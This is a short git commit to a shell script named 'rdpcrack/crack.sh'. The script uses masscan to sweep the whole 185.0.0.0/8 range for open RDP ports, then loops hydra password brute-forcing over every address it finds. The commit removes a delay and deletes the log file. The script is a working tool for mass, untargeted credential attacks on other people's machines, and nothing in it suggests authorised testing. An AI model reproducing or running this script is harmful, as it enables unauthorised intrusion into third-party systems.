c08f2a8c7fb864d25c2882570d7a2c831d17eba4
independentcod <ind3p3nd3nt@outlook.com>
2020-04-04 15:03:27 -0400

    Enjoy!

--- rdpcrack/crack.sh
+++ rdpcrack/crack.sh
@@ -1,3 +1,4 @@
 #sudo masscan --range 185.0.0.0-185.255.255.255 --rate 5000 -p3389 --open --banners -oG rdp.scan;
-for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do sleep 5 && hydra -vv rdp://$i -L user -P pass -t3 -W3 -I >hydra.log;
+rm -rf hydra.log;
+for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -L user -P pass -t1 -W1 -I >hydra.log;
 done
